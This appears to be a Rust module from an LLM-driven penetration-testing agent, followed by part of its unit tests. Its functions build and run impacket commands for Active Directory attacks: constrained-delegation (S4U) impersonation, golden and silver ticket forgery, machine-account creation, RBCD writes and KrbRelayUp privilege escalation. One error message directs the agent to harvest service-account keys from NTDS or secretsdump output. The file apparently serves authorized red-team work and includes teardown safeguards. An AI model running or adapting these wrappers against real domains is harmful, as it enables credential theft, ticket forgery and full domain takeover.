//! Kerberos delegation and domain escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::parsers::SILVER_TICKET_SPN_MARKER;
use crate::ToolOutput;

/// Find delegation configurations in the domain using impacket-findDelegation.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Optional args: `password`, `hash` (at least one required)
pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let dc_ip = required_str(args, "dc_ip")?;

    let mut cmd = CommandBuilder::new("impacket-findDelegation");

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else {
        anyhow::bail!("find_delegation requires either password or hash");
    }

    cmd.flag("-dc-ip", dc_ip).timeout_secs(120).execute().await
}

/// Perform an S4U (constrained delegation) attack to obtain a service ticket.
///
/// Required args: `domain`, `username`, `target_spn`, `impersonate`
/// Optional args: `password`, `hash`, `aes_key`, `dc_ip`
pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
    build_s4u_command(args)?.execute().await
}

/// Build the `impacket-getST` command for an S4U attack.
///
/// Split out from [`s4u_attack`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
///
/// getST.py expects `domain/user:pass` or `domain/user -hashes :hash` — no
/// `@target` suffix (unlike secretsdump/wmiexec); the DC is specified via
/// `-dc-ip` instead. When an AES256 key is available it is passed via
/// `-aesKey` so getST requests AES-etype tickets. Without it, impacket
/// authenticates RC4-only through `-hashes` and an AES-only delegating
/// account (or a hardened DC with RC4 disabled) rejects the S4U TGS with
/// `KDC_ERR_ETYPE_NOSUPP`.
#[doc(hidden)]
pub fn build_s4u_command(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    // Treat empty-string secrets as "not provided" — impacket-getST would
    // otherwise prompt interactively and the task would time out.
    let password = optional_str(args, "password").filter(|s| !s.is_empty());
    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
    let target_spn = required_str(args, "target_spn")?;
    let impersonate = required_str(args, "impersonate")?;
    let dc_ip = optional_str(args, "dc_ip");

    let mut cmd = CommandBuilder::new("impacket-getST")
        .flag("-spn", target_spn)
        .flag("-impersonate", impersonate);

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else if aes_key.is_some() {
        // AES-only authenticator: secretsdump yielded an AES key but no usable
        // NT hash/password. getST derives the TGT from `-aesKey` alone, so the
        // positional identity carries no secret.
        cmd = cmd.arg(format!("{domain}/{username}"));
    } else {
        anyhow::bail!("s4u_attack requires a non-empty password, hash, or aes_key — got none");
    }

    // Supply the AES256 key so getST negotiates AES etypes. This is the fix
    // for `KDC_ERR_ETYPE_NOSUPP` on accounts/DCs where RC4 is disabled.
    if let Some(aes) = aes_key {
        cmd = cmd.flag("-aesKey", aes);
    }

    Ok(cmd.timeout_secs(120).flag_opt("-dc-ip", dc_ip))
}

/// Generate a Kerberos golden ticket using impacket-ticketer.
///
/// Required args: `krbtgt_hash`, `domain_sid`, `domain`
/// Optional args: `extra_sid`, `username`
pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
    let krbtgt_hash = required_str(args, "krbtgt_hash")?;
    let domain_sid = required_str(args, "domain_sid")?;
    let domain = required_str(args, "domain")?;
    let extra_sid = optional_str(args, "extra_sid");
    let username = optional_str(args, "username").unwrap_or("Administrator");
    // -nthash expects a 32-char NT hash; strip any LM half if the LLM
    // passed a `LM:NT` concatenated form.
    let nt = credentials::nt_hash_only(krbtgt_hash);

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", nt)
        .flag("-domain-sid", domain_sid)
        .flag("-domain", domain)
        .flag_opt("-extra-sid", extra_sid)
        .flag("-user-id", "500")
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Forge a Kerberos silver ticket (a service ticket for one SPN) using
/// impacket-ticketer.
///
/// Required args: `username` (the account that owns `spn`, e.g. `SQL01$` or
/// `svc_sql`), `domain`, `spn`, `domain_sid`
/// Auth — one of `hash`/`nt_hash`/`ntlm_hash` (NTLM) or `aes_key` (AES256)
/// Optional args: `impersonate` (the principal embedded in the ticket,
/// defaults to `Administrator`)
///
/// `username` names the *signing* account, not the ticket's subject. That
/// split is what makes the tool reachable: the worker's credential resolver
/// keys `hash`/`aes_key` injection off `(username, domain)`, so naming the
/// service account there is the only way state-held material reaches ticketer.
/// The subject travels in `impersonate`, matching [`s4u_attack`].
///
/// On success the SPN is stamped into stdout as [`SILVER_TICKET_SPN_MARKER`].
/// ticketer's own output is byte-identical for a TGT and an SPN-scoped TGS —
/// same `Saving ticket in <principal>.ccache` line, no mention of the scope —
/// so that marker is the only thing that tells the two apart downstream. The
/// parser reads it for the forged-service evidence, and the orchestrator's
/// golden-ticket completion check uses its presence to refuse to publish a
/// domain-wide TGT milestone off a single-service ticket.
pub async fn generate_silver_ticket(args: &Value) -> Result<ToolOutput> {
    let spn = required_str(args, "spn")?;
    let ticket_dir = std::path::PathBuf::from(SILVER_TICKET_DIR);
    let _ = std::fs::create_dir_all(&ticket_dir);
    let mut output = build_silver_ticket_command(args)?
        .current_dir(&ticket_dir)
        .execute()
        .await?;

    if output.success {
        output
            .stdout
            .push_str(&format!("\n{SILVER_TICKET_SPN_MARKER}{spn}\n"));
    }
    Ok(output)
}

/// Directory the forged silver ticket is written to. Shared with the
/// inter-realm forge so operation teardown's ccache sweep covers it.
const SILVER_TICKET_DIR: &str = "/tmp/ares-tickets";

/// Build the `impacket-ticketer` command for a silver ticket.
///
/// Split out from [`generate_silver_ticket`] so unit tests can assert on the
/// constructed argument vector (via `args_for_test`) without spawning the
/// binary.
///
/// AES is preferred over the NT hash whenever state carries one: a silver
/// ticket is presented straight to the service, and a host configured for
/// AES-only Kerberos rejects an RC4-encrypted TGS. ticketer refuses both key
/// forms at once ("Pick only one"), so this is an either/or, not a pair.
#[doc(hidden)]
pub fn build_silver_ticket_command(args: &Value) -> Result<CommandBuilder> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let spn = required_str(args, "spn")?;
    let domain_sid = required_str(args, "domain_sid")?;
    let impersonate = optional_str(args, "impersonate")
        .filter(|s| !s.is_empty())
        .unwrap_or("Administrator");
    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());

    if !spn.contains('/') {
        anyhow::bail!(
            "generate_silver_ticket: `spn` must be a service class and host \
             (e.g. cifs/sql01.contoso.local), got '{spn}'. A silver ticket is \
             scoped to one SPN — without the service class ticketer forges a \
             ticket no service will accept."
        );
    }

    let mut cmd = CommandBuilder::new("impacket-ticketer")
        .flag("-domain-sid", domain_sid)
        .flag("-domain", domain)
        .flag("-spn", spn)
        .flag("-user-id", "500");

    if let Some(aes) = aes_key {
        cmd = cmd.flag("-aesKey", aes);
    } else if let Some(raw) = credentials::ntlm_hash_arg(args) {
        cmd = cmd.flag("-nthash", credentials::nt_hash_only(raw));
    } else {
        anyhow::bail!(
            "generate_silver_ticket needs the signing key for '{username}' in \
             {domain}: supply `aes_key` (AES256) or `hash`/`nt_hash`/`ntlm_hash` \
             (NTLM). Neither was present in operation state for that principal — \
             harvest the service account's key (secretsdump of a host it runs on, \
             a gMSA read, or an NTDS dump) before forging."
        );
    }

    Ok(cmd.arg(impersonate).timeout_secs(120))
}

/// Apply the shared auth precedence to an impacket command whose identity is a
/// bare `domain/username[:password]` string with no `@target` suffix
/// (`addcomputer`, `rbcd` — unlike `secretsdump`/`wmiexec`, which append the
/// host and are served by [`credentials::impacket_target`]).
///
/// Precedence: `ticket_path` > NTLM hash (`hash`/`nt_hash`/`ntlm_hash`) >
/// `password`. The identity carries `:password` ONLY on the password branch —
/// appending it under hash or ccache auth makes impacket prefer the cleartext
/// bind and discard the pass-the-hash/Kerberos material entirely.
fn impacket_identity_auth(
    cmd: CommandBuilder,
    args: &Value,
    domain: &str,
    username: &str,
) -> Result<CommandBuilder> {
    let identity = format!("{domain}/{username}");

    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
        return Ok(cmd
            .arg(identity)
            .arg("-k")
            .arg("-no-pass")
            .env(ccname_key, ccname_val)
            .env(cfg_key, cfg_val));
    }

    if let Some(raw) = credentials::ntlm_hash_arg(args) {
        return Ok(cmd
            .arg(identity)
            .args(credentials::hash_args(&credentials::lm_nt_hash_pair(raw)?))
            .arg("-no-pass"));
    }

    let password = optional_str(args, "password")
        .filter(|s| !s.is_empty())
        .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
    Ok(cmd.arg(format!("{identity}:{password}")))
}

/// Add a computer account to the domain using impacket-addcomputer.
///
/// Required args: `domain`, `username`, `computer_name`, `dc_ip`
/// (`computer_password` required only for the default add action).
/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
/// [`impacket_identity_auth`]:
///   - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`); also
///     needs `dc_host`, since addcomputer.py raises "Kerberos auth requires
///     DNS name of the target DC. Use -dc-host." before it ever connects
///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
///   - `password` — plaintext, folded into the identity string
///
/// Optional args: `action` (`add` [default] | `delete`), `dc_host`. `delete`
///                removes the named computer — used by operation teardown to
///                drop a machine account this op created.
pub async fn add_computer(args: &Value) -> Result<ToolOutput> {
    let mut out = build_add_computer(args)?.execute().await?;
    if out.success && add_computer_refused(&out.combined()) {
        out.success = false;
    }
    Ok(out)
}

/// impacket-addcomputer reports refusals on stdout and still exits 0.
///
/// A delete the authenticating principal is not entitled to perform prints
/// `[-] User <u> doesn't have right to delete <c>$!` and returns success, so
/// every caller — the LLM, and operation teardown — is told the machine account
/// is gone while it is still in the directory. Teardown's read-back probe
/// caught it as `unverified`, but only because that one plan carries a probe;
/// the tool must not claim a mutation it did not make.
///
/// The add side exits 0 on refusal too. A name collision is the dangerous one:
/// the account already exists because something else owns it, and a journalled
/// "creation" makes teardown delete an object this operation never created.
#[doc(hidden)]
pub fn add_computer_refused(output: &str) -> bool {
    let lower = output.to_lowercase();
    lower.contains("doesn't have right to")
        || lower.contains("does not have right to")
        || lower.contains("unable to delete")
        || lower.contains("already exists!")
        || lower.contains("machine quota exceeded")
        || lower.contains("the server denied the operation")
        || lower.contains("requires a stronger authentication")
        || lower.contains("status_access_denied")
        || (lower.contains("account") && lower.contains("not found in"))
}

/// Build the `impacket-addcomputer` command.
///
/// Split out from [`add_computer`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
#[doc(hidden)]
pub fn build_add_computer(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let computer_name = required_str(args, "computer_name")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = optional_str(args, "action").unwrap_or("add");
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    if optional_str(args, "ticket_path").is_some_and(|s| !s.is_empty()) && dc_host.is_none() {
        anyhow::bail!(
            "add_computer with a Kerberos ccache also needs `dc_host` (the DC's DNS \
             name) — impacket-addcomputer rejects `-k` without `-dc-host`"
        );
    }

    let mut cmd = impacket_identity_auth(
        CommandBuilder::new("impacket-addcomputer"),
        args,
        domain,
        username,
    )?
    .flag("-computer-name", computer_name)
    .flag("-dc-ip", dc_ip)
    .flag_opt("-dc-host", dc_host);

    if matches!(action, "delete" | "del" | "remove") {
        cmd = cmd.arg("-delete");
    } else {
        cmd = cmd.flag("-computer-pass", required_str(args, "computer_password")?);
    }
    Ok(cmd.timeout_secs(120))
}

/// Add or remove an SPN on a target account using bloodyAD.
///
/// Required args: `domain`, `dc_ip`, `action`, `target_account`, `spn`
/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
/// [`credentials::bloodyad_base`]:
///   - `ticket_path` (Kerberos ccache; bloodyAD `-k ccache=<path>`)
///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
///   - `username` + `password` (plaintext NTLM bind)
pub async fn addspn(args: &Value) -> Result<ToolOutput> {
    build_addspn(args)?.execute().await
}

/// Build the `bloodyAD … spn` command.
///
/// Split out from [`addspn`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
#[doc(hidden)]
pub fn build_addspn(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = required_str(args, "action")?;
    let target_account = required_str(args, "target_account")?;
    let spn = required_str(args, "spn")?;

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg(action)
        .arg("spn")
        .arg(target_account)
        .arg(spn)
        .timeout_secs(120))
}

/// True for canonical SID strings (`S-1-5-21-…`), case-insensitively.
///
/// Used to reject a SID where impacket wants a sAMAccountName; see
/// [`build_rbcd_write`].
fn looks_like_sid(value: &str) -> bool {
    let mut chars = value.chars();
    matches!(chars.next(), Some('S' | 's'))
        && chars.next() == Some('-')
        && value.matches('-').count() >= 3
}

/// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
///
/// Required args: `domain`, `username`, `target_computer`, `attacker_account`,
///                `dc_ip`
/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
/// [`impacket_identity_auth`]:
///   - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`)
///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
///   - `password` — plaintext, folded into the identity string
///
/// Optional args: `dc_host`, `attacker_sid`. rbcd.py resolves the LDAP target
/// from `-dc-host` when set and otherwise falls back to an anonymous SMB lookup
/// of the DC's machine name, which a hardened DC refuses. `attacker_sid` is not
/// passed to impacket at all; teardown uses it as the read-back needle, because
/// the delegation attribute renders as SDDL containing raw SIDs.
pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
    build_rbcd_write(args)?.execute().await
}

/// Build the `impacket-rbcd` command.
///
/// Split out from [`rbcd_write`] so unit tests can assert on the constructed
/// argument vector (via `args_for_test`) without spawning the binary.
///
/// `-delegate-from` must be a **sAMAccountName**, not a SID: rbcd.py resolves it
/// with `(sAMAccountName=%s)` and, on a miss, logs "Account to escalate does not
/// exist!" and returns — while still exiting 0, so the caller sees success. A
/// SID is therefore rejected up front rather than silently no-opping.
#[doc(hidden)]
pub fn build_rbcd_write(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let target_computer = required_str(args, "target_computer")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());

    let attacker_account = optional_str(args, "attacker_account")
        .filter(|s| !s.is_empty())
        .ok_or_else(|| {
            anyhow::anyhow!(
                "rbcd_write requires 'attacker_account': the attacker-controlled \
                 sAMAccountName (e.g. EVILPC$) for -delegate-from. 'attacker_sid' is not a \
                 substitute — it is kept for teardown's read-back needle, which matches the \
                 SDDL rendering of the delegation attribute."
            )
        })?;

    if looks_like_sid(attacker_account) {
        anyhow::bail!(
            "rbcd_write: -delegate-from needs a sAMAccountName (e.g. EVILPC$), got the SID \
             '{attacker_account}'. impacket-rbcd resolves -delegate-from via \
             (sAMAccountName=...), so a SID matches nothing, the write is skipped, and rbcd.py \
             still exits 0 — the failure would otherwise look like success."
        );
    }

    let action = match optional_str(args, "action").unwrap_or("write") {
        "write" => "write",
        "remove" => "remove",
        other => anyhow::bail!(
            "rbcd_write: unsupported action '{other}'. Use 'write' or 'remove' — 'flush' wipes \
             the whole attribute including delegation entries this operation did not create."
        ),
    };

    let cmd = CommandBuilder::new("impacket-rbcd")
        .flag("-delegate-to", target_computer)
        .flag("-delegate-from", attacker_account)
        .flag("-action", action)
        .flag("-dc-ip", dc_ip)
        .flag_opt("-dc-host", dc_host);

    Ok(impacket_identity_auth(cmd, args, domain, username)?.timeout_secs(120))
}

/// Run KrbRelayUp for local privilege escalation via Kerberos relay.
///
/// Required args: `domain`, `dc_ip`
/// Optional args: `method`, `create_user`, `create_password`
pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let method = optional_str(args, "method");
    let create_user = optional_str(args, "create_user");
    let create_password = optional_str(args, "create_password");

    CommandBuilder::new("KrbRelayUp")
        .arg("relay")
        .flag("-d", domain)
        .flag("-dc", dc_ip)
        .flag_opt("-m", method)
        .flag_opt("-cls", create_user)
        .flag_opt("-cp", create_password)
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use crate::credentials;
    use serde_json::json;

    #[test]
    fn find_delegation_requires_domain() {
        let args = json!({
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn find_delegation_requires_username() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn find_delegation_requires_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn find_delegation_with_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let domain = required_str(&args, "domain").unwrap();
        let username = required_str(&args, "username").unwrap();
        let password = optional_str(&args, "password");
        assert_eq!(domain, "contoso.local");
        assert_eq!(username, "admin");
        assert_eq!(password, Some("P@ssw0rd!"));
    }

    #[test]
    fn find_delegation_with_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "dc_ip": "192.168.58.10"
        });
        let hash = optional_str(&args, "hash").unwrap();
        let hash_args = credentials::hash_args(hash);
        assert_eq!(hash_args[0], "-hashes");
        // Hash already has colon, should be passed as-is
        assert!(hash_args[1].contains(':'));
    }

    #[test]
    fn find_delegation_requires_password_or_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let password = optional_str(&args, "password");
        let hash = optional_str(&args, "hash");
        assert!(password.is_none());
        assert!(hash.is_none());
    }

    #[test]
    fn find_delegation_no_auth_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::find_delegation(&args));
        // Should bail with "requires either password or hash"
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("password or hash"));
    }

    #[test]
    fn s4u_attack_requires_target_spn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "impersonate": "Administrator"
        });
        assert!(required_str(&args, "target_spn").is_err());
    }

    #[test]
    fn s4u_attack_requires_impersonate() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local"
        });
        assert!(required_str(&args, "impersonate").is_err());
    }

    #[test]
    fn s4u_attack_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(
            required_str(&args, "target_spn").unwrap(),
            "cifs/dc01.contoso.local"
        );
        assert_eq!(required_str(&args, "impersonate").unwrap(), "Administrator");
        assert_eq!(optional_str(&args, "dc_ip"), Some("192.168.58.10"));
    }

    #[test]
    fn s4u_attack_no_auth_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::s4u_attack(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("password, hash, or aes_key"));
    }

    #[test]
    fn s4u_attack_empty_password_and_hash_errors() {
        // Regression: an empty password/hash string must be rejected as if
        // absent — impacket-getST would otherwise prompt interactively and
        // the task would time out.
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "",
            "hash": "",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::s4u_attack(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("password, hash, or aes_key"));
    }

    #[test]
    fn s4u_attack_passes_aes_key_alongside_hash() {
        // secretsdump yields both the NT hash and the AES256 key for a machine
        // account. Both must reach getST: `-hashes` for the identity and
        // `-aesKey` so the TGS is requested with an AES etype — without the
        // latter, an RC4-disabled DC returns KDC_ERR_ETYPE_NOSUPP.
        let aes = "a".repeat(64);
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
            "aes_key": aes,
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        let cmd = super::build_s4u_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(
            a.iter().any(|x| x == "-aesKey"),
            "expected -aesKey flag: {a:?}"
        );
        assert!(
            a.iter().any(|x| x == &aes),
            "expected the AES key value: {a:?}"
        );
        assert!(
            a.iter().any(|x| x == "-hashes"),
            "hash auth must still be present: {a:?}"
        );
    }

    #[test]
    fn s4u_attack_aes_key_only_authenticates() {
        // AES key present, no NT hash/password — getST derives the TGT from
        // `-aesKey` alone, so the positional identity carries no secret and the
        // wrapper must not bail.
        let aes = "b".repeat(64);
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "aes_key": aes,
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let cmd = super::build_s4u_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(
            a.iter().any(|x| x == "-aesKey"),
            "expected -aesKey flag: {a:?}"
        );
        assert!(
            a.iter().any(|x| x == "contoso.local/svc_web$"),
            "identity must be the bare domain/user with no secret: {a:?}"
        );
        assert!(
            a.iter().all(|x| x != "-hashes"),
            "no -hashes when only AES is available: {a:?}"
        );
    }

    #[test]
    fn s4u_attack_omits_aes_key_flag_when_absent() {
        // Password auth with no AES key — `-aesKey` must not appear so getST
        // keeps its default etype negotiation.
        let args = json!({
            "domain": "contoso.local",
            "username": "svc_web$",
            "password": "P@ssw0rd!",
            "target_spn": "cifs/dc01.contoso.local",
            "impersonate": "Administrator"
        });
        let cmd = super::build_s4u_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(
            a.iter().all(|x| x != "-aesKey"),
            "no -aesKey without an AES key: {a:?}"
        );
    }

    #[test]
    fn golden_ticket_requires_krbtgt_hash() {
        let args = json!({
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "krbtgt_hash").is_err());
    }

    #[test]
    fn golden_ticket_requires_domain_sid() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "domain_sid").is_err());
    }

    #[test]
    fn golden_ticket_default_username() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "Administrator");
    }

    #[test]
    fn golden_ticket_custom_username() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "username": "fakeadmin"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "fakeadmin");
    }

    #[test]
    fn golden_ticket_extra_sid_optional() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local",
            "extra_sid": "S-1-5-21-0000000000-000000000-000000000-519"
        });
        assert_eq!(
            optional_str(&args, "extra_sid"),
            Some("S-1-5-21-0000000000-000000000-000000000-519")
        );
    }

    #[test]
    fn golden_ticket_extra_sid_absent() {
        let args = json!({
            "krbtgt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "domain": "contoso.local"
        });
        assert!(optional_str(&args, "extra_sid").is_none());
    }

    fn silver_ticket_base() -> Value {
        json!({
            "username": "SQL01$",
            "domain": "contoso.local",
            "spn": "MSSQLSvc/sql01.contoso.local:1433",
            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
            "hash": "0123456789abcdef0123456789abcdef",
        })
    }

    #[test]
    fn silver_ticket_forges_for_the_named_spn() {
        let cmd = super::build_silver_ticket_command(&silver_ticket_base()).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(
            flag_value(argv, "-spn"),
            Some("MSSQLSvc/sql01.contoso.local:1433")
        );
        assert_eq!(flag_value(argv, "-domain"), Some("contoso.local"));
        assert_eq!(
            flag_value(argv, "-domain-sid"),
            Some("S-1-5-21-1234567890-987654321-1122334455")
        );
        assert_eq!(flag_value(argv, "-user-id"), Some("500"));
    }

    /// The distinguishing property against `generate_golden_ticket`: the key is
    /// the service account's, never krbtgt's, and `-spn` is always present. A
    /// silver ticket without `-spn` is a golden ticket signed with the wrong key.
    #[test]
    fn silver_ticket_never_forges_a_tgt() {
        let cmd = super::build_silver_ticket_command(&silver_ticket_base()).unwrap();
        let argv = cmd.args_for_test();
        assert!(
            argv.iter().any(|a| a == "-spn"),
            "silver ticket must be SPN-scoped: {argv:?}"
        );
        assert!(
            argv.iter().all(|a| !a.starts_with("krbtgt/")),
            "a krbtgt SPN makes this a golden ticket: {argv:?}"
        );
    }

    #[test]
    fn silver_ticket_defaults_the_embedded_principal_to_administrator() {
        let cmd = super::build_silver_ticket_command(&silver_ticket_base()).unwrap();
        assert!(cmd.args_for_test().iter().any(|a| a == "Administrator"));
    }

    #[test]
    fn silver_ticket_honours_the_impersonate_override() {
        let args = with_arg(&silver_ticket_base(), "impersonate", "alice");
        let cmd = super::build_silver_ticket_command(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "alice"));
        assert!(argv.iter().all(|a| a != "Administrator"));
    }

    /// AES wins over the NT hash: the forged TGS goes straight to the service,
    /// and an AES-only host rejects an RC4 ticket. ticketer refuses both key
    /// flags at once, so only one may appear.
    #[test]
    fn silver_ticket_prefers_aes_over_the_nt_hash() {
        let aes = "c".repeat(64);
        let args = with_arg(&silver_ticket_base(), "aes_key", &aes);
        let cmd = super::build_silver_ticket_command(&args).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(flag_value(argv, "-aesKey"), Some(aes.as_str()));
        assert!(
            argv.iter().all(|a| a != "-nthash"),
            "ticketer rejects -nthash alongside -aesKey: {argv:?}"
        );
    }

    #[test]
    fn silver_ticket_strips_the_lm_half_from_a_pair() {
        let args = with_arg(&silver_ticket_base(), "hash", &format!("{LM}:{NT}"));
        let cmd = super::build_silver_ticket_command(&args).unwrap();
        assert_eq!(flag_value(cmd.args_for_test(), "-nthash"), Some(NT));
    }

    #[test]
    fn silver_ticket_accepts_nt_hash_and_ntlm_hash_spellings() {
        for key in ["nt_hash", "ntlm_hash"] {
            let mut args = silver_ticket_base();
            args.as_object_mut().unwrap().remove("hash");
            let args = with_arg(&args, key, NT);
            let cmd = super::build_silver_ticket_command(&args)
                .unwrap_or_else(|e| panic!("{key} must satisfy the signing key: {e}"));
            assert_eq!(flag_value(cmd.args_for_test(), "-nthash"), Some(NT));
        }
    }

    /// Without a key the wrapper must refuse rather than let ticketer prompt or
    /// forge with nothing — and the error has to name every accepted spelling so
    /// the agent knows what to harvest.
    #[test]
    fn silver_ticket_without_a_signing_key_errors_naming_every_form() {
        let mut args = silver_ticket_base();
        args.as_object_mut().unwrap().remove("hash");
        let Err(err) = super::build_silver_ticket_command(&args) else {
            panic!("a silver ticket cannot be forged without the service account's key");
        };
        let err = err.to_string();
        for form in ["aes_key", "hash", "nt_hash", "ntlm_hash"] {
            assert!(err.contains(form), "error must name `{form}`; got: {err}");
        }
    }

    #[test]
    fn silver_ticket_empty_hash_is_treated_as_absent() {
        let args = with_arg(&silver_ticket_base(), "hash", "");
        assert!(super::build_silver_ticket_command(&args).is_err());
    }

    /// A bare hostname or service class alone forges a TGS no service accepts,
    /// and ticketer exits 0 doing it — reject it before the subprocess runs.
    #[test]
